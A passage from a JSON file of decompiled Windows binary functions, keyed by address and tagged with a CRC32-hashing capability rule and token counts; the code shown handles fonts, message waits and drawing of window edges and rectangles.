var_2ch._3_1_ = *(var_4h + 0x1e);\n        if ((var_2ch._3_1_ == '\\x01') && (*0x492b96 != '\\x01')) {\n            var_2ch._3_1_ = *0x492b96;\n        }\n        puStack112 = &stack0xfffffffc;\n        var_34h = var_38h;\n        fcn.00405794();\n        uVar2 = fcn.004059dc(*0x424918);\n        fcn.00405794(0, uVar2);\n        uVar2 = fcn.004059dc();\n        iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n        if (iVar3 == 2) {\n            fcn.00405794();\n            fcn.0040a930();\n        }\n        else {\n            fcn.00405794();\n            fcn.0040a930();\n        }\n        if (((**0x495d18 == 1) && (cVar1 = fcn.0042b3e4(),  cVar1 == -0x80)) && (cVar1 = fcn.004246bc(),  cVar1 != '\\0')\n           ) {\n            var_2ch._3_1_ = -0x80;\n        }\n        var_26h = 0;\n        if (var_34h == 0) {\n            var_28h = 0;\n        }\n        else {\n            var_28h = 7;\n        }\n        var_27h = 0;\n        cVar1 = fcn.00424a60();\n        if (cVar1 == '\\x01') {\n            var_25h = 2;\n        }\n        else if (cVar1 == '\\x02') {\n            var_25h = 1;\n        }\n        else {\n            var_25h = 0;\n        }\n        puStackY148 = &fcn.004246e8::var_40h;\n        uVar2 = sub.gdi32.dll_CreateFontIndirectA();\n        *(var_4h + 8) = uVar2;\n    }\n    *in_FS_OFFSET = puStackY148;\n    fcn.004239d4(0x4248e3);\n    return;\n}\n",
        "token_count": 1148
    },
    "0042579c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042579c(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    param_2 = ~*(in_EAX + 2) & param_2;\n    if (*0x425810 != param_2) {\n        if ((param_2 & 1) != 0) {\n            (**(*in_EAX + 0x14))();\n            if (in_EAX[1] == 0) {\n                fcn.0040dbc0();\n                fcn.00404ec4();\n            }\n        }\n        if ((param_2 & 2) != 0) {\n            fcn.0042583c();\n        }\n        if ((param_2 & 4) != 0) {\n            fcn.00425868();\n        }\n        if ((param_2 & 8) != 0) {\n            fcn.00425898();\n        }\n        *(in_EAX + 2) = param_2 | *(in_EAX + 2);\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0042eae8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042eae8(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint32_t *arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_20h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0042ea28();\n    if (var_4h == 0) {\n        uVar1 = sub.kernel32.dll_WaitForMultipleObjectsEx\n                          (arg_10h, arg_14h, -((arg_8h & 1) != 0), arg_ch, -((arg_8h & 2) != 0));\n    }\n    else {\n        while( true ) {\n            uVar1 = sub.user32.dll_MsgWaitForMultipleObjectsEx(arg_10h, arg_14h, arg_ch, 0xbf, arg_8h);\n            if (uVar1 != arg_10h) break;\n            iVar2 = sub.user32.dll_PeekMessageA();\n            if (iVar2 != 0) {\n                sub.user32.dll_TranslateMessage(&var_20h);\n                sub.user32.dll_DispatchMessageA();\n            }\n        }\n    }\n    if (uVar1 == 0x102) {\n        uVar3 = 0x8001011f;\n    }\n    else if (uVar1 == 0xc0) {\n        uVar3 = 0x80010115;\n    }\n    else {\n        uVar3 = 0;\n        if ((uVar1 < 0x80) || (arg_10h + 0x80 <= uVar1)) {\n            *arg_18h = uVar1;\n        }\n        else {\n            *arg_18h = uVar1 - 0x80;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 426
    },
    "00433a50": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t __fastcall fcn.00433a50(uint param_1, uint8_t param_2)\n\n{\n    int16_t in_AX;\n    int16_t iVar1;\n    uint var_3h;\n    \n    var_3h._2_1_ = in_AX >> 8;\n    iVar1 = 0;\n    if (var_3h._2_1_ == '\\0') {\n        if ((param_2 & 1) != 0) {\n            in_AX = in_AX + 0x2000;\n        }\n        if ((param_2 & 4) != 0) {\n            in_AX = in_AX + 0x4000;\n        }\n        iVar1 = in_AX;\n        if ((param_2 & 2) != 0) {\n            iVar1 = in_AX + -0x8000;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 220
    },
    "00434cd8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434cd8(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43561a;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x00434d94;\n        fcn.004321c4();\n        cVar3 = fcn.004322cc();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x00434d94;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.00424f64();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.004321c4();\n        cVar3 = fcn.004322cc();\n        if (cVar3 == '\\0') {\n            fcn.00424f64();\n        }\n        else {\n            fcn.00424f64();\n        }\n        fcn.004246a8();\n        puVar2 = puStack24;\n    }\ncode_r0x00434d94:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x21) != '\\0')) {\n        fcn.00425308();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047dc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -0x10) = *(lprc + -0x20) + 1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405974();\n    if (bVar9) {\n        fcn.00425308();\n        *(lprc + -0x10) = 0;\n        *(lprc + -8) = 0xfffffffc;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00448914(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -8) = *(lprc + -0x10);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -8) = *(lprc + -0x10) + 0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -8) = *(lprc + -0x10) + *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if ((*(*(lprc + -0x38) + 0x38) != '\\0') && (*(lprc + -0x21) == '\\0')) {\n                *(lprc + -8) = *(lprc + -8) + 1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.00424f5c();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.00424f5c();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042b8b4();\n                    fcn.00424f38();\n                    fcn.00425308();\n                }\n                else {\n                    fcn.00424f64();\n                    fcn.00425308();\n                }\n                fcn.00424f64();\n                *(lprc + -0x10) = *(lprc + -0x10) + 1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0x10) = iVar5 + *(lprc + -0x10) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -8) = iVar5 + *(lprc + -0x10);\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.004253d0();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00448914(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.00429388();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042a570();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.004246a8();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.0042525c(iVar5);\n                    fcn.004246a8();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404650(0x435279);\n                    return;\n                }\n                fcn.00448c04(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if (((*(*(lprc + -0x38) + 0x38) != '\\0') || ((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')))) &&\n       (*(lprc + -0x21) == '\\0')) {\n        uVar7 = fcn.004256c0();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x20) = *(lprc + -8) + 1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00424f64();\n        }\n        fcn.00425308();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.004256c0();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.004256c0();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -8) + 1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4934d0) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00424a34();\n    }\n    fcn.00434a80(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if ((((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) && (*(lprc + -0x21) == '\\0')\n       ) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.00434a80(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        *(lprc + -0x20) = *(lprc + -0x18);\n        *(lprc + -0x18) = *(lprc + -0x54) + -10;\n        iVar5 = lprc + -0x20;\n        uVar8 = *(lprc + -0x29);\n        in_stack_ffffffa4 = 2;\n        fcn.00433adc();\n        fcn.00434a80(in_stack_ffffffa4, uVar8, iVar5);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00405530(0x435621);\n    return;\n}\n",
        "token_count": 4172
    },
    "00435638": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435638(int32_t lprc)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    char cVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    int32_t in_stack_ffffffa4;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x435f9a;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if ((*(lprc + -0x21) == '\\0') || (puVar2 = &stack0xfffffffc,  *(lprc + -0x22) == '\\0')) {\n        puVar2 = &stack0xfffffffc;\n        if (*(lprc + -0x21) == '\\0') goto code_r0x004356f4;\n        fcn.004321c4();\n        cVar3 = fcn.004322cc();\n        puVar2 = puStack24;\n        if (cVar3 == '\\0') goto code_r0x004356f4;\n    }\n    puStack24 = puVar2;\n    if (((*(lprc + 0xc) & 1) == 0) && ((*(lprc + 0xc) & 0x40) == 0)) {\n        puVar2 = puStack24;\n        if (*(lprc + 8) != '\\0') {\n            fcn.00424f64();\n            puVar2 = puStack24;\n        }\n    }\n    else {\n        fcn.004321c4();\n        cVar3 = fcn.004322cc();\n        if (cVar3 == '\\0') {\n            fcn.00424f64();\n        }\n        else {\n            fcn.00424f64();\n        }\n        fcn.004246a8();\n        puVar2 = puStack24;\n    }\ncode_r0x004356f4:\n    puStack24 = puVar2;\n    if ((*(lprc + -0x29) == '\\0') || ((*(lprc + -0x21) != '\\0' && (*(*(lprc + -0x38) + 0x38) == '\\0')))) {\n        fcn.00425308();\n    }\n    if (*(lprc + -0x30) == 0) {\n        cVar3 = fcn.004047dc();\n        if (cVar3 == '\\0') {\n            *(lprc + -0x31) = 0;\n        }\n        else {\n            *(lprc + -0x31) = *(*(lprc + -0x30) + 0x60);\n        }\n    }\n    else {\n        *(lprc + -0x31) = 0;\n    }\n    *(lprc + -8) = *(lprc + -0x18) + -1;\n    iVar5 = *(lprc + -0x1c) + 1;\n    bVar9 = iVar5 == 0;\n    *(lprc + -0xc) = iVar5;\n    fcn.00405974();\n    if (bVar9) {\n        fcn.00425308();\n        *(lprc + -0x10) = *(lprc + -8) + 2;\n        *(lprc + -8) = 0;\n        *(lprc + -0x39) = 0;\n    }\n    else {\n        if ((*(lprc + -0x40) == 0) ||\n           (((iVar5 = *(*(lprc + -0x38) + 0x40),  iVar5 < 0 || (iVar6 = fcn.00448914(),  iVar6 <= iVar5)) &&\n            ((*(*(lprc + -0x38) + 0x38) == '\\0' ||\n             ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 != NULL && (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 == '\\0')))\n             ))))) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 1;\n        }\n        *(lprc + -0x41) = uVar4;\n        if ((*(lprc + -0x41) == '\\0') &&\n           ((piVar1 = *(*(lprc + -0x38) + 0x4c),  piVar1 == NULL || (cVar3 = (**(*piVar1 + 0x1c))(),  cVar3 != '\\0'))))\n        {\n            if ((*(lprc + -0x40) == 0) || (*(lprc + 8) != '\\0')) {\n                *(lprc + -0x10) = *(lprc + -8);\n                *(lprc + -4) = *(lprc + -0xc);\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            *(lprc + -0x39) = 0;\n        }\n        else {\n            *(lprc + -0x39) = 1;\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x10) = *(lprc + -8) + -0x10;\n                *(lprc + -4) = *(lprc + -0xc) + 0x10;\n            }\n            else {\n                *(lprc + -0x10) = *(lprc + -8) - *(*(lprc + -0x40) + 0x34);\n                *(lprc + -4) = *(lprc + -0xc) + *(*(lprc + -0x40) + 0x30);\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -0x10) = *(lprc + -0x10) + -1;\n                *(lprc + -4) = *(lprc + -4) + 1;\n                uVar7 = fcn.00424f5c();\n                *(lprc + -0x48) = uVar7;\n                if ((*(lprc + 0xc) & 1) == 0) {\n                    uVar7 = fcn.00424f5c();\n                    *(lprc + -0x48) = uVar7;\n                    fcn.0042b8b4();\n                    fcn.00424f38();\n                    fcn.00425308();\n                }\n                else {\n                    fcn.00424f64();\n                    fcn.00425308();\n                }\n                fcn.00424f64();\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -0xc) = *(lprc + -0xc) + 1;\n            }\n            if (*(lprc + -0x41) == '\\0') {\n                *(lprc + -0x5c) = *(lprc + -0x10);\n                *(lprc + -0x58) = *(lprc + -0xc);\n                *(lprc + -0x54) = *(lprc + -8);\n                *(lprc + -0x50) = *(lprc + -4);\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                if (iVar5 < *(lprc + -8) - *(lprc + -0x10)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    uVar8 = (*(lprc + -8) - *(lprc + -0x10)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -8) = (*(lprc + -8) - iVar5) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x2c))();\n                    *(lprc + -0x10) = *(lprc + -8) - iVar5;\n                }\n                iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                if (iVar5 < *(lprc + -4) - *(lprc + -0xc)) {\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar5;\n                    iVar5 = uVar8 >> 1;\n                    if (iVar5 < 0) {\n                        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n                    }\n                    *(lprc + -0xc) = iVar5 + *(lprc + -0xc) + 1;\n                    iVar5 = (**(**(*(lprc + -0x38) + 0x4c) + 0x20))();\n                    *(lprc + -4) = iVar5 + *(lprc + -0xc);\n                }\n                fcn.004253d0();\n                *(lprc + -0x10) = *(lprc + -0x5c);\n                *(lprc + -0xc) = *(lprc + -0x58);\n                *(lprc + -8) = *(lprc + -0x54);\n                *(lprc + -4) = *(lprc + -0x50);\n            }\n            else {\n                iVar5 = *(*(lprc + -0x38) + 0x40);\n                if ((iVar5 < 0) || (iVar6 = fcn.00448914(),  iVar6 <= iVar5)) {\n                    uVar7 = fcn.00429388();\n                    *(lprc + -0x4c) = uVar7;\n                    *in_FS_OFFSET = &stack0xffffffd4;\n                    (**(**(lprc + -0x4c) + 0x3c))();\n                    sub.user32.dll_LoadBitmapA(0, 0x7ff8);\n                    fcn.0042a570();\n                    *(lprc + -0x48) = *(*(*(lprc + -0x28) + 0xc) + 0x18);\n                    fcn.004246a8();\n                    iVar5 = *(lprc + -0x4c);\n                    iVar6 = (**(**(lprc + -0x4c) + 0x20))();\n                    uVar8 = (*(lprc + -4) - *(lprc + -0xc)) - iVar6;\n                    iVar6 = uVar8 >> 1;\n                    if (iVar6 < 0) {\n                        iVar6 = iVar6 + ((uVar8 & 1) != 0);\n                    }\n                    (**(**(lprc + -0x4c) + 0x2c))(iVar6 + *(lprc + -0xc) + 1);\n                    fcn.0042525c(iVar5);\n                    fcn.004246a8();\n                    *in_FS_OFFSET = iVar5;\n                    fcn.00404650(0x435be1);\n                    return;\n                }\n                fcn.00448c04(*(*(lprc + -0x38) + 0x39), *(*(lprc + -0x38) + 0x40), *(lprc + -0xc));\n            }\n            if (*(*(lprc + -0x38) + 0x38) != '\\0') {\n                *(lprc + -8) = *(lprc + -8) + -1;\n                *(lprc + -4) = *(lprc + -4) + -1;\n            }\n        }\n    }\n    *(lprc + -0x10) = *(lprc + -0x10) + -1;\n    *(lprc + -0xc) = *(lprc + -0xc) + -1;\n    *(lprc + -8) = *(lprc + -8) + 2;\n    *(lprc + -4) = *(lprc + -4) + 2;\n    if ((*(*(lprc + -0x38) + 0x38) != '\\0') ||\n       (((*(lprc + -0x29) != '\\0' && (*(lprc + -0x39) != '\\0')) && (*(lprc + -0x21) == '\\0')))) {\n        uVar7 = fcn.004256c0();\n        sub.user32.dll_DrawEdge(uVar7);\n    }\n    if (*(lprc + -0x29) != '\\0') {\n        if (*(lprc + -0x39) != '\\0') {\n            *(lprc + -0x18) = *(lprc + -0x10) + -1;\n        }\n        if ((*(lprc + -0x5d) == '\\0') || (*(lprc + 8) == '\\0')) {\n            fcn.00424f64();\n        }\n        fcn.00425308();\n    }\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x5d) != '\\0')) && ((*(lprc + -0x21) == '\\0' || (*(lprc + -0x22) == '\\0')))\n       ) {\n        if (*(lprc + -0x29) == '\\0') {\n            if ((*(lprc + 0xc) & 0x40) != 0) {\n                uVar7 = fcn.004256c0();\n                sub.user32.dll_DrawEdge(uVar7);\n            }\n        }\n        else {\n            uVar7 = fcn.004256c0();\n            sub.user32.dll_DrawEdge(uVar7);\n        }\n        if (*(lprc + -0x29) == '\\0') {\n            iStack32 = lprc + -0x20;\n            sub.user32.dll_OffsetRect();\n        }\n    }\n    if ((*(lprc + -0x29) == '\\0') || (*(lprc + -0x39) == '\\0')) {\n        *(lprc + -0x18) = *(lprc + -0x10) + -1;\n    }\n    *(lprc + -0x20) = *(lprc + -0x20) + 2;\n    *(lprc + -0x18) = *(lprc + -0x18) + -1;\n    *(lprc + -100) = *(*(lprc + -0x31) * 2 + 0x4934d0) | 0x60;\n    if ((*(lprc + -0x65) != '\\0') && ((*(lprc + 0xd) & 1) != 0)) {\n        *(lprc + -100) = *(lprc + -100) | 0x100000;\n    }\n    *(lprc + -0x5c) = *(lprc + -0x20);\n    *(lprc + -0x58) = *(lprc + -0x1c);\n    *(lprc + -0x54) = *(lprc + -0x18);\n    *(lprc + -0x50) = *(lprc + -0x14);\n    if ((*(lprc + 0xc) & 0x20) != 0) {\n        fcn.00424a34();\n    }\n    fcn.00434a80(*(lprc + -100) | 0x500, *(lprc + -0x29), lprc + -0x20);\n    *(lprc + -0x20) = *(lprc + -0x5c);\n    *(lprc + -0x18) = *(lprc + -0x54);\n    uVar8 = (*(lprc + -0x50) - *(lprc + -0x58)) - (*(lprc + -0x14) - *(lprc + -0x1c));\n    iVar5 = uVar8 >> 1;\n    if (iVar5 < 0) {\n        iVar5 = iVar5 + ((uVar8 & 1) != 0);\n    }\n    sub.user32.dll_OffsetRect(lprc + -0x20, 0, iVar5);\n    if (((*(lprc + 8) != '\\0') && (*(lprc + -0x29) != '\\0')) && (*(lprc + -0x5d) != '\\0')) {\n        sub.user32.dll_OffsetRect(lprc + -0x20, 1, 0);\n    }\n    fcn.00434a80(*(lprc + -100), *(lprc + -0x29), lprc + -0x20);\n    if ((*(*(lprc + -0x38) + 0x60) != 0) && (*(lprc + 8) == '\\0')) {\n        fcn.00433adc();\n        *(lprc + -0x20) = 10;\n        iVar5 = fcn.0042551c();\n        *(lprc + -0x18) = iVar5 + *(lprc + -0x20);\n        in_stack_ffffffa4 = 2;\n        fcn.00434a80(2, *(lprc + -0x29), lprc + -0x20);\n    }\n    *in_FS_OFFSET = in_stack_ffffffa4;\n    fcn.00405530(0x435fa1);\n    return;\n}\n",
        "token_count": 4208
    },
    "00435fb8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435fb8(uint noname_0, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_ECX;\n    uint var_65h;\n    uint var_5dh;\n    uint var_40h;\n    uint var_38h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    var_20h = *in_ECX;\n    uStack32 = in_ECX[1];\n    uStack28 = in_ECX[2];\n    uStack24 = in_ECX[3];\n    iVar2 = fcn.00436afc();\n    iVar3 = fcn.00436110();\n    cVar1 = fcn.0040e38c();\n    if ((cVar1 != '\\0') && (iVar4 = fcn.004321c4(),  *(iVar4 + 5) != '\\0')) {\n        (***0x4958ec)(0, 0x3e9);\n    }\n    if (((iVar2 == 0) || ((*(iVar2 + 0x40) == '\\0' && (iVar3 == 0)))) ||\n       ((*(in_EAX + 0x9a) == 0 && (*(in_EAX + 0x92) == 0)))) {\n        if ((iVar2 == 0) || (cVar1 = fcn.0043837c(),  cVar1 != '\\0')) {\n            fcn.00435638(&stack0xfffffffc);\n        }\n        else {\n            fcn.00434cd8(&stack0xfffffffc);\n        }\n    }\n    else {\n        (**(*in_EAX + 0x34))((arg_ch & 1) != 0);\n        if (*(in_EAX + 0x9a) != 0) {\n            (*in_EAX[0x26])(arg_ch, &var_20h);\n        }\n    }\n    return;\n}\n",
        "token_count": 473
    },
    "004369c4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
